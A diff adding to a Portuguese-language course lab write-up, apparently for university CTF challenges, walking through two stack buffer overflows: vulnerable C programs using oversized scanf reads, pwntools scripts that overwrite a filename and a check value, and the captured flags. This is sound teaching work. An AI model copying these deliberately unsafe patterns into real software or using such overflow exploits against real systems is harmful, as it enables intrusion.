@@ -106,3 +106,140 @@ Como são alocados apenas 100 bytes para a variável local buffer, e a string de
         # id                                                                           
         uid=0(root) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
 
+
+## **CTF - Desafio 1**
+
+## Análise do Código
+
+Analisando o Código podemos perceber que o programa abre um ficheiro "mem.txt" cujo nome está guardado na variável meme_file.
+O programa pede um input do tipo string com tamanho de 28 bytes, que é guardado no buffer usando scanf. Como o buffer tem apenas 20 bytes de comprimento é possível causar overflow e até alterar a variável meme_file completamente para um nome à nossa escolha.
+
+        #include <stdio.h>
+        #include <stdlib.h>
+
+        int main() {
+            char meme_file[8] = "mem.txt\0";
+            char buffer[20];
+
+            printf("Try to unlock the flag.\n");
+            printf("Show me what you got:");
+            fflush(stdout);
+            scanf("%28s", &buffer);
+
+            printf("Echo %s\n", buffer);
+            
+
+            printf("I like what you got!\n");
+            
+            FILE *fd = fopen(meme_file,"r");
+            
+            while(1){
+                if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
+                    printf("%s", buffer);
+                } else {
+                    break;
+                }
+            }
+
+
+            fflush(stdout);
+            
+            return 0;
+        }
+
+## Preparar e executar o ataque
+
+Preparar o input a enviar para o programa. Para reescrever a variável meme_file, temos de enviar 20 caracteres (para preencher o buffer) e de seguida o nome que queremos colocar em meme_file: flag.txt. O código python para executar o ataque é o seguinte.
+
+        #!/usr/bin/python3
+        from pwn import *
+
+        DEBUG = False
+
+        if DEBUG:
+            r = process('./program')
+        else:
+            r = remote('ctf-fsi.fe.up.pt', 4003)
+
+        r.recvuntil(b":")
+        r.sendline(b"AAAABBBBAAAABBBBAAAAflag.txt")
+        r.interactive()
+
+De seguida basta executar o script python e observar:
+
+    python3 exploit-example.py 
+    [+] Opening connection to ctf-fsi.fe.up.pt on port 4003: Done
+    [*] Switching to interactive mode
+    Echo AAAABBBBAAAABBBBAAAAflag.txt
+    I like what you got!
+    flag{bd5845361bcae9b37f62787760b5763b}
+    [*] Got EOF while reading in interactive 
+
+## **CTF - Desafio 2**
+
+## Análise do Código
+
+Analisando o Código podemos perceber que o programa abre um ficheiro "mem.txt" cujo nome está guardado na variável meme_file.
+O programa pede um input do tipo string com tamanho de 32 bytes, que é guardado no buffer usando scanf. Como o buffer tem apenas 20 bytes de comprimento é possível causar overflow e alterar as variáveis que se encontram em cima na memória. Este programa verifica o valor da variável val e apenas lê o ficheiro se este for 0xfefc2122.
+
+    #include <stdio.h>
+    #include <stdlib.h>
+
+    int main() {
+        char meme_file[8] = "mem.txt\0";
+        char val[4] = "\xef\xbe\xad\xde";
+        char buffer[20];
+
+        printf("Try to unlock the flag.\n");
+        printf("Show me what you got:");
+        fflush(stdout);
+        scanf("%32s", &buffer);
+        if(*(long*)val == 0xfefc2122) {
+            printf("I like what you got!\n");
+            
+            FILE *fd = fopen(meme_file,"r");
+            
+            while(1){
+                if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
+                    printf("%s", buffer);
+                } else {
+                    break;
+                }
+            }
+        } else {
+            printf("You gave me this %s and the value was %p. Disqualified!\n", meme_file, *(long*)val);
+        }
+
+        fflush(stdout);
+        
+        return 0;
+    }
+
+## Preparar e executar o ataque
+
+Para reescrever a variável meme_file, temos de enviar 20 bytes (para preencher o buffer), 4 bytes específicos, \x22\x21\xfc\xfe (0xfefc2122 em little endian), para reescrever val com o valor necessário e finalmente enviar 8 bytes com o nome do ficheiro que pretendemos abrir para alterar meme_file. O código python para executar o ataque é o seguinte.
+
+    #!/usr/bin/python3
+    from pwn import *
+
+    DEBUG = False
+
+    if DEBUG:
+        r = process('./program')
+    else:
+        r = remote('ctf-fsi.fe.up.pt', 4000)
+
+    r.recvuntil(b":")
+    r.sendline(b"AAAABBBBAAAABBBBAAAA\x22\x21\xfc\xfeflag.txt")
+    r.interactive()
+
+    #address fefc2122
+
+De seguida, basta executar o script python e observar.
+
+    python3 exploit-example.py 
+    [+] Opening connection to ctf-fsi.fe.up.pt on port 4000: Done
+    [*] Switching to interactive mode
+    I like what you got!
+    flag{9acfa2344e8a8dfd9949d1be42732518}
+    [*] Got EOF while reading in interactive
